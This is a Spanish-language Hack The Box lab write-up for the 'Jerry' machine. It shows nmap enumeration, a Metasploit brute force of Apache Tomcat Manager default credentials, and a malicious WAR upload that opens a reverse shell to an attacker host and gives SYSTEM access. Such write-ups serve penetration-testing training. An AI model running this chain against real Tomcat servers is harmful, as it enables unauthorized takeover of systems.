---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - Tomcat
  - MSF
  - LoginBruteForcing
  - WarFileUpload
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Enumeración del Sistema|Enumeración del Sistema]]
	- [[#Enumeración#Enumeración de Puertos|Enumeración de Puertos]]
	- [[#Enumeración#HTTP|HTTP]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Tomcat Manager Brute Force|Tomcat Manager Brute Force]]
	- [[#Explotación#WAR File Upload → Remote Code Execution|WAR File Upload → Remote Code Execution]]

---
# Jerry

![](Screenshots/Pasted%20image%2020260516113116.png)

>Máquina de Hack The Box llamada **[Jerry](https://app.hackthebox.com/machines/Jerry)**, centrada en la explotación de un servicio vulnerable de **Apache Tomcat**.  
>La intrusión comienza identificando un panel administrativo accesible en el puerto `8080`, donde se realiza un ataque de fuerza bruta contra el gestor de Tomcat utilizando credenciales por defecto.  
>Tras obtener acceso al panel `Tomcat Manager`, se sube una aplicación maliciosa en formato `.war`, logrando ejecución remota de comandos y acceso directo como `NT AUTHORITY\SYSTEM`.

---
## Enumeración
### Enumeración del Sistema

```PowerShell
ping -c 1 10.129.37.107
PING 10.129.37.107 (10.129.37.107) 56(84) bytes of data.
64 bytes from 10.129.37.107: icmp_seq=1 ttl=127 time=47.3 ms

--- 10.129.37.107 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 47.316/47.316/47.316/0.000 ms
```

El `TTL=127` es característico de sistemas Windows (normalmente 128 - 1 salto), lo que nos permite saber el sistema operativo.
### Enumeración de Puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.37.107 -oG allPorts
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 127
```

```PowerShell
nmap -p8080 -sCV 10.129.37.107 -oN targeted
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

Se identifican los siguientes puertos:
- `8080 → HTTP`
### HTTP

```HTTP
http://10.129.37.107:8080/
```

![](Screenshots/Pasted%20image%2020260516104943.png)

Se identifica un servidor `Apache Tomcat 7.0.88`, una tecnología Java ampliamente utilizada para desplegar aplicaciones web.  
  
La presencia del panel `Tomcat Manager` suele ser especialmente interesante, ya que frecuentemente utiliza credenciales débiles o por defecto y permite desplegar aplicaciones `.war`, lo que puede derivar en ejecución remota de código.

---
## Explotación
### Tomcat Manager Brute Force

Se usa *msfconsole* para automatizar el proceso.

El módulo realiza un ataque de fuerza bruta contra el panel `Tomcat Manager`, probando combinaciones conocidas de credenciales por defecto utilizadas habitualmente en instalaciones inseguras de Apache Tomcat.

```PowerShell
msfconsole -q
msf > use auxiliary/scanner/http/tomcat_mgr_login
msf exploit(scanner/http/tomcat_mgr_login) > set RHOSTS 10.129.37.107
msf exploit(scanner/http/tomcat_mgr_login) > exploit

[+] 10.129.37.107:8080 - Login Successful: tomcat:s3cret
```

Se obtienen las credenciales válidas: `tomcat:s3cret`.
### WAR File Upload → Remote Code Execution

El panel `Tomcat Manager` permite desplegar aplicaciones Java en formato `.war`.  
  
Un archivo `.war` (*Web Application Archive*) puede contener código JSP malicioso, permitiendo obtener ejecución remota de comandos cuando la aplicación es desplegada y accedida desde el navegador.

```PowerShell
msf exploit(scanner/http/tomcat_mgr_login) > use exploit/multi/http/tomcat_mgr_upload
msf auxiliary(multi/http/tomcat_mgr_upload) > set RHOSTS 10.129.37.107
msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
msf auxiliary(multi/http/tomcat_mgr_upload) > set LHOST [ATTACKER_IP]
msf auxiliary(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
msf auxiliary(multi/http/tomcat_mgr_upload) > set HttpPassword s3cret
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

Se obtiene una consola interactiva con `nt authority\system`.

El servicio Tomcat se ejecuta con privilegios elevados en el sistema, por lo que la shell obtenida hereda directamente el contexto `NT AUTHORITY\SYSTEM`.

La flag de `usuario` y de `root` se encuentran en: `C:\Users\Administrator\Desktop\flags`.

---

